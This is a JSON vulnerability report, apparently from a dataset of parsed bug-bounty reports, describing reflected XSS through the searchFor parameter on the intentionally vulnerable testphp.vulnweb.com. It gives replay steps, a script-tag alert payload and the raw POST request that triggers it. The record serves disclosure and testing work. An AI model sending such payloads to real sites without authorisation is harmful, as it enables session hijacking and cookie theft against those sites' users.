{
  "report_id": 800001,
  "title": "Reflected XSS in Search Function via searchFor Parameter on testphp.vulnweb.com",
  "vuln_type": "xss_reflected",
  "severity": "medium",
  "target_url": "http://testphp.vulnweb.com/search.php?test=query",
  "target_domain": "testphp.vulnweb.com",
  "weakness": "Cross-site Scripting (XSS) - Reflected",
  "description": "The search functionality is vulnerable to Reflected Cross-Site Scripting via the searchFor parameter. An attacker can inject malicious JavaScript code, which will be executed by the browser.",
  "impact": "An attacker can craft a malicious form that auto-submits to the search endpoint, causing arbitrary JavaScript execution in the victim's browser, enabling session hijacking, cookie theft, and phishing.",
  "steps": [
    {
      "order": 1,
      "description": "Navigate to the search page",
      "method": null,
      "url": "http://testphp.vulnweb.com/",
      "headers": {},
      "params": {},
      "body": null,
      "payload": null,
      "expected_behavior": "The search form is displayed",
      "browser_action": "Locate the search form on the page"
    },
    {
      "order": 2,
      "description": "Enter the XSS payload in the search field",
      "method": null,
      "url": null,
      "headers": {},
      "params": {},
      "body": null,
      "payload": "<script>alert(document.domain)</script>",
      "expected_behavior": "The payload is reflected in the response",
      "browser_action": "Enter the XSS payload in the search field"
    },
    {
      "order": 3,
      "description": "Submit the search form",
      "method": "POST",
      "url": "http://testphp.vulnweb.com/search.php?test=query",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "params": {},
      "body": "searchFor=<script>alert(document.domain)</script>&goButton=go",
      "payload": "<script>alert(document.domain)</script>",
      "expected_behavior": "An alert box appears showing the domain name",
      "browser_action": "Click the 'go' button to submit the search"
    }
  ],
  "replay_method": "http",
  "requires_auth": false,
  "auth_details": null,
  "original_report_text": "## Summary\nThe search functionality at `http://testphp.vulnweb.com/search.php?test=query` is vulnerable to Reflected Cross-Site Scripting. When a user submits a search via POST request, the `searchFor` parameter value is reflected directly in the response HTML without sanitization.\n\n## Steps to Reproduce\n1. Navigate to `http://testphp.vulnweb.com/`\n2. Locate the search form on the page\n3. Enter the following XSS payload in the search field: `<script>alert(document.domain)</script>`\n4. Click the 'go' button to submit the search\n5. Observe that an alert box appears showing the domain name, confirming JavaScript execution\n\nAlternatively, send this HTTP request directly:\n```\nPOST /search.php?test=query HTTP/1.1\nHost: testphp.vulnweb.com\nContent-Type: application/x-www-form-urlencoded\n\nsearchFor=<script>alert(document.domain)</script>&goButton=go\n```\n\nThe response contains:\n```html\n<h2 id='pageName'>searched for: <script>alert(document.domain)</script></h2>\n```\n\nThe payload is reflected without any encoding or sanitization.\n\n## Impact\nAn attacker can craft a malicious form that auto-submits to the search endpoint, causing arbitrary JavaScript execution in the victim's browser. This enables session hijacking, cookie theft, and phishing.",
  "parsed_at": "2026-01-31T19:22:28.135540",
  "confidence": 0.9
}